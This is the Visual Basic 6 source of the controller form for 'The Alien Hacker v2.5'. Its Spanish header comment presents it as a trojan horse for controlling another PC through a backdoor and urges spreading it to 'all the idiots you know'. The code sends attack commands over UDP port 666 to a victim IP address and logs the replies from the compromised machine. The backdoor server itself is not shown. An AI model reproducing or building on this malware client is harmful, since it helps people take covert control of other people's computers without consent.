VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmCliente 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "The Alien Hacker v2.5"
   ClientHeight    =   3990
   ClientLeft      =   5715
   ClientTop       =   4050
   ClientWidth     =   5085
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3990
   ScaleWidth      =   5085
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer tmrTiempo 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   4560
      Top             =   0
   End
   Begin VB.CommandButton cmdAbout 
      Caption         =   "&Sobre..."
      Height          =   360
      Left            =   2525
      TabIndex        =   4
      Top             =   1920
      Width           =   1150
   End
   Begin VB.Frame frmMsg 
      BackColor       =   &H00000000&
      Caption         =   "Mensaje / Programa"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808000&
      Height          =   735
      Left            =   2520
      TabIndex        =   10
      Top             =   1020
      Width           =   2415
      Begin VB.TextBox txtMsg 
         BackColor       =   &H00008080&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   2175
      End
   End
   Begin VB.CommandButton cmdSalir 
      Cancel          =   -1  'True
      Caption         =   "&Salir"
      Height          =   360
      Left            =   3790
      TabIndex        =   5
      Top             =   1920
      Width           =   1150
   End
   Begin VB.CommandButton cmdEnviar 
      Caption         =   "&Atacar"
      Default         =   -1  'True
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   360
      Left            =   120
      TabIndex        =   3
      Top             =   1920
      Width           =   2295
   End
   Begin VB.Frame frmLog 
      BackColor       =   &H00000000&
      Caption         =   "Logs"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808000&
      Height          =   1455
      Left            =   120
      TabIndex        =   9
      Top             =   2400
      Width           =   4815
      Begin VB.TextBox txtLogs 
         BackColor       =   &H00008080&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   1095
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   6
         Top             =   240
         Width           =   4575
      End
   End
   Begin VB.Frame frmTipo 
      BackColor       =   &H00000000&
      Caption         =   "Tipo de ataque"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808000&
      Height          =   735
      Left            =   120
      TabIndex        =   8
      Top             =   1020
      Width           =   2295
      Begin VB.ComboBox cmbTipo 
         BackColor       =   &H00008080&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   330
         ItemData        =   "client.frx":0442
         Left            =   120
         List            =   "client.frx":0458
         Style           =   2  'Dropdown List
         TabIndex        =   1
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.Frame frmIP 
      BackColor       =   &H00000000&
      Caption         =   "Direccion IP"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808000&
      Height          =   735
      Left            =   120
      TabIndex        =   7
      Top             =   240
      Width           =   2295
      Begin VB.TextBox txtIp 
         BackColor       =   &H00008080&
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   330
         Left            =   120
         TabIndex        =   0
         Top             =   240
         Width           =   2055
      End
   End
   Begin MSWinsockLib.Winsock wskServer 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemotePort      =   666
   End
   Begin VB.Image imgLogo 
      Height          =   1005
      Left            =   2520
      Picture         =   "client.frx":0496
      Top             =   0
      Width           =   2535
   End
End
Attribute VB_Name = "frmCliente"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'=================================================================
'              THE ALIEN HACKER v2.5 - Trojan Horse
'
'             Autor: Andres Santos... alias [AnDuFo]
'
'   Este programa fue hecho con la intencion de que controles
'   a otra PC, por medio de un backdoor...
'
'   Gracias por usar el Alien Hacker v2.5, distribuye el trojan
'   a todos los estupidos que conozcas, chao-x!
'
'=================================================================


'Sobre el programa...
Private Sub cmdAbout_Click()
    frmAbout.Show
End Sub

'Envio de ataque...
Private Sub cmdEnviar_Click()

Dim command As String
Dim mensaje As Variant

On Error GoTo salir

    command = cmbTipo.Text
    mensaje = txtMsg.Text

    With wskServer
     .RemoteHost = txtIp.Text
     .SendData command
     .SendData mensaje
    End With
    
    cmdEnviar.Enabled = False
    tmrTiempo.Enabled = True
    Exit Sub
salir:
    Exit Sub
End Sub

Private Sub Form_Load()
    
    'Configura Winsock, el puerto de entrada...
    With wskServer
     .Protocol = sckUDPProtocol
     .RemotePort = 666
     .Bind
    End With
    
End Sub

Private Sub tmrTiempo_Timer()
    Dim n_hora As Date
    n_hora = Time
    txtLogs.Text = txtLogs.Text & "[" & n_hora & "] " & txtIp.Text & ": Victima no encontrada..." & vbCrLf
    cmdEnviar.Enabled = True
    tmrTiempo.Enabled = False
End Sub


Private Sub txtIp_GotFocus()
SendKeys "{home}+{end}"
End Sub


Private Sub txtMsg_GotFocus()
SendKeys "{home}+{end}"
End Sub

'Los logs que llegan del sistema remoto...
Private Sub wskServer_DataArrival(ByVal bytesTotal As Long)
Dim Reply As String
Dim n_hora As Date
n_hora = Time
    wskServer.GetData Reply
    txtLogs.Text = txtLogs.Text & "[" & n_hora & "] " & wskServer.RemoteHostIP & ": " & Reply & vbCrLf
    'Devuelve el control al programa...
    cmdEnviar.Enabled = True
    tmrTiempo.Enabled = False
End Sub

'Efectos de los botones...
Private Sub cmdAbout_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdAbout.FontBold = True
End Sub

Private Sub cmdAbout_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdAbout.FontBold = False
End Sub

Private Sub cmdEnviar_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdEnviar.FontBold = True
End Sub

Private Sub cmdEnviar_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdEnviar.FontBold = False
End Sub

Private Sub cmdSalir_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdSalir.FontBold = True
End Sub

Private Sub cmdSalir_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    cmdSalir.FontBold = False
End Sub

'Sale del programa...
Private Sub cmdSalir_Click()
    Unload Me
    End
End Sub
